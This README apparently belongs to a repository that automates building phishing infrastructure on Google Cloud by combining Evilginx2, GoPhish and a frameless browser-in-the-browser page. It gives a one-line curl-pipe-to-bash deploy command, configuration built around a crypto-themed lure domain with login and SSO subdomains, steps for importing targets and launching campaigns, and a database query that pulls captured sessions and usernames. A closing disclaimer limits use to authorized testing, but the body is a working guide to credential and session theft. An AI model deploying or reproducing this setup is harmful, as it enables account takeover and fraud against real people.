# 🎯 Frameless BITB - Complete Automation Suite

## From ZERO to Fully Functional Phishing Infrastructure in Minutes

This repository now includes **FULL AUTOMATION** for deploying a complete phishing infrastructure on Google Cloud Platform.

---

## 🚀 Quick Start - The Simplest Way

### One Command Deployment

Open [Google Cloud Shell](https://console.cloud.google.com/) and run:

```bash
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash
```

**That's it!** ✨

The script will guide you through:
1. Domain configuration
2. GCP project setup
3. Billing enablement
4. Infrastructure deployment
5. Complete installation

Total time: **20-40 minutes** (mostly automated)

---

## 📦 What's Included

### Core Components
- ✅ **Evilginx2** - Latest version, built from source
- ✅ **GoPhish v0.12.1** - Campaign management
- ✅ **Apache2** - Reverse proxy with custom substitutions
- ✅ **Frameless BITB** - Non-iframe BITB implementation
- ✅ **Go 1.22.0** - Latest stable version

### Infrastructure
- ✅ **GCP VM Instance** - Ubuntu 22.04 LTS
- ✅ **Static IP Address** - Reserved external IP
- ✅ **Firewall Rules** - HTTP, HTTPS, DNS, Admin
- ✅ **SSL Certificates** - Self-signed + Let's Encrypt support
- ✅ **Cloud DNS** - Optional automatic DNS setup
- ✅ **Systemd Services** - Auto-start on boot

### Management Tools
- ✅ **Service Management** - Start, stop, restart commands
- ✅ **Log Viewing** - Centralized log access
- ✅ **Status Monitoring** - Health checks
- ✅ **Validation Script** - Comprehensive testing
- ✅ **Integration Tools** - Evilginx + GoPhish sync

---

## 📁 Deployment Scripts

### Primary Scripts

| Script | Purpose | Usage |
|--------|---------|-------|
| `quick-deploy.sh` | One-click deployment | Cloud Shell one-liner |
| `master-deploy.sh` | Full GCP automation | Manual Cloud Shell run |
| `vm-install.sh` | VM installation | Runs automatically on VM |
| `test-setup.sh` | Validation & testing | Run after deployment |
| `gophish-integration.sh` | Evilginx + GoPhish sync | Session management |

### Legacy Scripts (Still Supported)

| Script | Purpose |
|--------|---------|
| `setup-gcloud.sh` | Original installation script |
| `gcp-deploy.sh` | Original GCP deployment |
| `install.sh` | One-liner installer (local) |

---

## 🎯 Deployment Methods

### Method 1: Quick Deploy (Recommended)

**Best for**: First-time users, quick setup

```bash
# In Google Cloud Shell
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash
```

**Prompts you for**:
- Domain name
- Admin email

**Automates everything else!**

### Method 2: Master Deploy (Advanced)

**Best for**: Custom configuration, advanced users

```bash
# In Google Cloud Shell
git clone https://github.com/theroseinc/bitbevilgophish.git
cd bitbevilgophish

# Optional: Edit configuration
nano config.env

# Run deployment
bash master-deploy.sh
```

**Provides full control over**:
- GCP project settings
- VM configuration
- DNS setup method
- All deployment options

### Method 3: Manual Setup (Traditional)

**Best for**: Local VMs, non-GCP deployments

Follow the original [README.md](README.md) for manual installation.

---

## ⚙️ Configuration

### Pre-Deployment Configuration

Edit `config.env` before deployment:

```bash
# Domain Configuration
DOMAIN="exodustraderai.info"
EMAIL="admin@exodustraderai.info"

# GCP Configuration
GCP_PROJECT_ID="my-phishing-project"
INSTANCE_NAME="evilginx-server"
ZONE="us-central1-a"
REGION="us-central1"
MACHINE_TYPE="e2-medium"      # e2-small, e2-medium, e2-standard-2
BOOT_DISK_SIZE="30GB"

# DNS Configuration
USE_CLOUD_DNS="true"           # true = Cloud DNS, false = Manual

# Port Configuration
EVILGINX_PORT="8443"
GOPHISH_ADMIN_PORT="3333"
GOPHISH_PHISH_PORT="8080"

# Versions
GO_VERSION="1.22.0"
GOPHISH_VERSION="0.12.1"
```

### Environment Variable Override

Override any setting via environment variables:

```bash
export DOMAIN="mydomain.com"
export MACHINE_TYPE="e2-standard-2"
bash master-deploy.sh
```

---

## 🌐 DNS Setup Options

### Option 1: Google Cloud DNS (Automatic)

**Advantages**:
- ✅ Fully automated
- ✅ Integrated with GCP
- ✅ Easy management
- ✅ Fast propagation

**How it works**:
1. Script creates DNS zone
2. Provides nameservers
3. You update at registrar
4. Records auto-created

**Set in config**:
```bash
USE_CLOUD_DNS="true"
```

### Option 2: Manual A Records

**Advantages**:
- ✅ Use existing DNS provider
- ✅ No GCP DNS costs
- ✅ More control

**Required records**:
```
Type: A    Host: @           Value: [SERVER_IP]
Type: A    Host: *           Value: [SERVER_IP]
Type: A    Host: login       Value: [SERVER_IP]
Type: A    Host: account     Value: [SERVER_IP]
Type: A    Host: www         Value: [SERVER_IP]
Type: A    Host: sso         Value: [SERVER_IP]
Type: A    Host: portal      Value: [SERVER_IP]
```

**Set in config**:
```bash
USE_CLOUD_DNS="false"
```

---

## 📊 Deployment Phases Explained

The master script executes **10 automated phases**:

### Phase 1: Environment Detection
- Detects Cloud Shell or local environment
- Verifies gcloud CLI
- Determines public IP for firewall

### Phase 2: Configuration Review
- Displays all settings
- Confirms deployment parameters
- Allows cancellation

### Phase 3: GCP Project Setup
- Creates new project (or uses existing)
- Sets active project
- Prompts for billing enablement

### Phase 4: API Enablement
- Enables Compute Engine API
- Enables Cloud DNS API
- Enables Resource Manager API
- Waits for propagation

### Phase 5: Static IP Reservation
- Reserves external static IP
- Saves IP for DNS configuration
- Displays IP address

### Phase 6: DNS Configuration
- **Option A**: Sets up Cloud DNS zone
- **Option B**: Provides manual instructions
- Creates/prompts for A records

### Phase 7: Firewall Rules
- HTTP (80) - Public access
- HTTPS (443) - Public access
- DNS (53) - Public access
- GoPhish Admin (3333) - Restricted to your IP

### Phase 8: VM Creation
- Creates Ubuntu 22.04 VM
- Attaches static IP
- Adds startup script
- Begins automated installation

### Phase 9: Installation Monitor
- Connects to VM
- Tails installation log
- Shows real-time progress
- Detects completion

### Phase 10: Final Summary
- Displays access URLs
- Shows management commands
- Provides next steps
- Saves deployment info

---

## 🔍 Monitoring & Verification

### Check Installation Progress

```bash
# From Cloud Shell
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/phishing-setup.log'
```

### Verify Deployment

```bash
# SSH into VM
gcloud compute ssh evilginx-server --zone=us-central1-a

# Run validation script
sudo bash /root/bitbevilgophish/test-setup.sh
```

This validates:
- ✅ System requirements
- ✅ Network connectivity
- ✅ DNS resolution
- ✅ Service status
- ✅ Port availability
- ✅ SSL certificates
- ✅ File structure
- ✅ Web endpoints
- ✅ Evilginx config
- ✅ GoPhish config
- ✅ Firewall rules

### Check Service Status

```bash
# On VM
bitb-status

# From Cloud Shell
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-status'
```

### View Logs

```bash
# All logs
bitb-logs

# Specific service
bitb-logs apache
bitb-logs evilginx
bitb-logs gophish
```

---

## 🛠️ Management Commands

Once SSH'd into the VM:

```bash
# Service Control
bitb-start      # Start all services
bitb-stop       # Stop all services
bitb-restart    # Restart all services
bitb-status     # Check status

# Log Viewing
bitb-logs           # All logs
bitb-logs apache    # Apache only
bitb-logs evilginx  # Evilginx only
bitb-logs gophish   # GoPhish only

# Manual Service Control (alternative)
systemctl start|stop|restart apache2
systemctl start|stop|restart evilginx
systemctl start|stop|restart gophish
```

---

## 🎯 Access Points

### Phishing Infrastructure

**Phishing Page**:
```
https://login.exodustraderai.info/?auth=2
```

**Base Domain**:
```
https://exodustraderai.info
```

### Admin Panels

**GoPhish Admin**:
```
https://[SERVER_IP]:3333
```
- Default credentials shown on first login
- Change password immediately!

**Evilginx Console**:
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Attach to Evilginx
tmux attach -t evilginx
```

---

## 🔒 SSL Certificate Management

### Self-Signed (Default)

Self-signed certificates are automatically created during installation.

**Location**: `/etc/ssl/localcerts/[DOMAIN]/`

### Let's Encrypt (Recommended)

After DNS propagates (5-10 minutes):

```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Get Let's Encrypt certificate
sudo certbot certonly --apache \
  -d exodustraderai.info \
  -d login.exodustraderai.info \
  -d account.exodustraderai.info \
  -d www.exodustraderai.info \
  -d sso.exodustraderai.info \
  -d portal.exodustraderai.info

# Update Apache config to use new certs
sudo sed -i 's|/etc/ssl/localcerts|/etc/letsencrypt/live|g' \
  /etc/apache2/sites-enabled/000-default.conf

# Restart Apache
sudo systemctl restart apache2
```

### Certificate Renewal

Let's Encrypt certificates expire in 90 days. Auto-renewal:

```bash
# Test renewal
sudo certbot renew --dry-run

# Force renewal
sudo certbot renew --force-renewal

# Auto-renewal (certbot sets up cron automatically)
sudo systemctl status certbot.timer
```

---

## 🎓 Usage Workflow

### 1. Initial Setup

```bash
# Deploy infrastructure
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash

# Wait for completion (20-40 minutes)

# Verify deployment
gcloud compute ssh evilginx-server --zone=us-central1-a
sudo bash /root/bitbevilgophish/test-setup.sh
```

### 2. Configure GoPhish

```bash
# Access GoPhish admin
https://[SERVER_IP]:3333

# Change default password
# Create email templates
# Setup SMTP profile
# Create landing pages
# Import target list
```

### 3. Launch Campaign

```bash
# In GoPhish:
# 1. Create new campaign
# 2. Select template, landing page, SMTP
# 3. Add targets
# 4. Set schedule
# 5. Launch!
```

### 4. Monitor Results

```bash
# View captured sessions
gcloud compute ssh evilginx-server --zone=us-central1-a

# Check Evilginx sessions
sudo sqlite3 /root/.evilginx/data.db "SELECT * FROM sessions WHERE username IS NOT NULL;"

# Use integration tool
sudo bash /root/bitbevilgophish/gophish-integration.sh

# View GoPhish dashboard
https://[SERVER_IP]:3333
```

---

## 🔧 Troubleshooting Guide

### Common Issues

#### 1. Services Not Starting

**Symptoms**: Services fail to start after deployment

**Solutions**:
```bash
# Check logs
bitb-logs

# Check specific service
systemctl status apache2
systemctl status evilginx
systemctl status gophish

# Restart services
bitb-restart

# Check for port conflicts
sudo netstat -tulpn | grep -E ':(80|443|53|3333|8443)'
```

#### 2. DNS Not Resolving

**Symptoms**: Domain doesn't resolve to server IP

**Solutions**:
```bash
# Check DNS propagation
nslookup exodustraderai.info
dig exodustraderai.info

# Check from different server
dig @8.8.8.8 exodustraderai.info

# Wait for propagation (5-10 minutes)

# Verify DNS records
gcloud dns record-sets list --zone=[ZONE-NAME]
```

#### 3. SSL Certificate Errors

**Symptoms**: Browser shows SSL warnings

**Solutions**:
```bash
# Check certificate
openssl x509 -in /etc/ssl/localcerts/exodustraderai.info/fullchain.pem -text -noout

# Get Let's Encrypt certificate
sudo certbot certonly --apache -d exodustraderai.info

# Verify certificate installation
curl -vI https://exodustraderai.info
```

#### 4. Apache Configuration Errors

**Symptoms**: Apache fails to start, shows config errors

**Solutions**:
```bash
# Test configuration
sudo apache2ctl configtest

# Check syntax
sudo apache2ctl -t

# View error log
sudo tail -f /var/log/apache2/error.log

# Restart Apache
sudo systemctl restart apache2
```

#### 5. Evilginx Port Conflict

**Symptoms**: Evilginx fails to bind to port 53

**Solutions**:
```bash
# Fix DNS stub listener
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Restart Evilginx
sudo systemctl restart evilginx
```

#### 6. GoPhish Admin Not Accessible

**Symptoms**: Cannot connect to GoPhish admin panel

**Solutions**:
```bash
# Check if GoPhish is running
systemctl status gophish

# Check firewall
sudo ufw status
sudo ufw allow 3333/tcp

# Check GCP firewall
gcloud compute firewall-rules list | grep 3333

# Update firewall rule with your current IP
gcloud compute firewall-rules update allow-gophish-admin \
  --source-ranges="[YOUR_NEW_IP]/32"
```

---

## 💰 Cost Management

### Monthly Cost Breakdown

| Resource | Type | Cost |
|----------|------|------|
| VM Instance | e2-medium | ~$25/mo |
| Static IP | Reserved | ~$3/mo |
| Cloud DNS | Zone + queries | ~$0.20/mo |
| Bandwidth | Egress | ~$1-5/mo |
| **TOTAL** | | **~$30-35/mo** |

### Cost Optimization Tips

```bash
# 1. Stop VM when not in use
gcloud compute instances stop evilginx-server --zone=us-central1-a

# 2. Use smaller instance
# Change MACHINE_TYPE="e2-small" in config.env (~$15/mo)

# 3. Use preemptible instance (60-91% discount)
# Add --preemptible flag to instance creation

# 4. Schedule auto-shutdown
# Set up cron to stop VM after hours

# 5. Monitor billing
gcloud billing accounts list
gcloud billing budgets list
```

---

## 🗑️ Complete Cleanup

### Delete Everything

```bash
# Method 1: Delete entire project (recommended)
gcloud projects delete [PROJECT_ID]

# Method 2: Delete resources individually
gcloud compute instances delete evilginx-server --zone=us-central1-a
gcloud compute addresses delete evilginx-static-ip --region=us-central1
gcloud compute firewall-rules delete allow-http-phishing
gcloud compute firewall-rules delete allow-https-phishing
gcloud compute firewall-rules delete allow-dns-phishing
gcloud compute firewall-rules delete allow-gophish-admin
gcloud dns managed-zones delete [ZONE-NAME]  # if using Cloud DNS
```

### Partial Cleanup (Keep Project)

```bash
# Just stop services (preserves data)
gcloud compute instances stop evilginx-server --zone=us-central1-a

# Delete VM but keep disk
gcloud compute instances delete evilginx-server --zone=us-central1-a --keep-disks=boot

# Release static IP (can re-reserve later)
gcloud compute addresses delete evilginx-static-ip --region=us-central1
```

---

## 📚 Documentation

- **[DEPLOYMENT.md](DEPLOYMENT.md)** - Comprehensive deployment guide
- **[README.md](README.md)** - Original Frameless BITB documentation
- **[README-AUTOMATION.md](README-AUTOMATION.md)** - This file

---

## 🎓 Learning Resources

### Video Tutorials
- [Frameless BITB Demo](https://youtu.be/luJjxpEwVHI)
- [BSides 2023 Talk](https://www.youtube.com/watch?v=p1opa2wnRvg)

### Official Documentation
- [Evilginx Docs](https://help.evilginx.com/)
- [GoPhish User Guide](https://docs.getgophish.com/)
- [GCP Compute Docs](https://cloud.google.com/compute/docs)

### Courses
- [Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery)
- [Phishing Red Team](https://www.offensive-security.com/)

---

## ⚠️ Legal & Ethical Use

### Authorized Use Only

This tool is **ONLY** for:
- ✅ Authorized penetration testing
- ✅ Red team engagements
- ✅ Security awareness training
- ✅ Educational purposes
- ✅ Personal research labs

### Prohibited Use

This tool is **NEVER** for:
- ❌ Unauthorized access attempts
- ❌ Real phishing attacks
- ❌ Credential theft
- ❌ Social engineering without permission
- ❌ Any illegal activities

### Best Practices

1. **Get Written Authorization**
   - Obtain signed permission before testing
   - Define scope clearly
   - Document everything

2. **Follow Responsible Disclosure**
   - Report findings to organization
   - Allow time for remediation
   - Don't publicly disclose without permission

3. **Protect Captured Data**
   - Securely store any collected information
   - Delete after testing
   - Never share or misuse

4. **Comply with Laws**
   - Know your local regulations
   - Follow industry standards
   - Respect privacy laws

---

## 🙏 Credits & Acknowledgments

- **Original Frameless BITB**: [waelmas/frameless-bitb](https://github.com/waelmas/frameless-bitb)
- **Evilginx2**: [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
- **GoPhish**: [gophish/gophish](https://github.com/gophish/gophish)
- **Apache Foundation**: [Apache HTTP Server](https://httpd.apache.org/)

---

## 📞 Support & Contributing

### Get Help

1. Check [DEPLOYMENT.md](DEPLOYMENT.md) troubleshooting section
2. Run validation: `sudo bash test-setup.sh`
3. Check logs: `bitb-logs`
4. Open GitHub issue with logs and error details

### Contribute

Contributions welcome!

```bash
# Fork repository
# Create feature branch
git checkout -b feature/amazing-feature

# Make changes and commit
git commit -m "Add amazing feature"

# Push and create PR
git push origin feature/amazing-feature
```

---

## 📝 Version History

### v2.0.0 - Complete Automation Suite
- ✅ Master deployment script
- ✅ One-click quick deploy
- ✅ Enhanced VM installation
- ✅ Comprehensive validation
- ✅ Cloud DNS integration
- ✅ Management tools

### v1.0.0 - Original Release
- ✅ Frameless BITB implementation
- ✅ Manual installation steps
- ✅ Apache configuration
- ✅ Evilginx integration

---

## 🚀 Quick Reference

```bash
# DEPLOY
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash

# ACCESS
gcloud compute ssh evilginx-server --zone=us-central1-a

# MANAGE
bitb-start | bitb-stop | bitb-restart | bitb-status | bitb-logs

# VERIFY
sudo bash /root/bitbevilgophish/test-setup.sh

# CLEANUP
gcloud compute instances delete evilginx-server --zone=us-central1-a
gcloud projects delete [PROJECT-ID]
```

---

**Made with ❤️ for authorized security professionals**

*Use responsibly. Test ethically. Stay legal.*
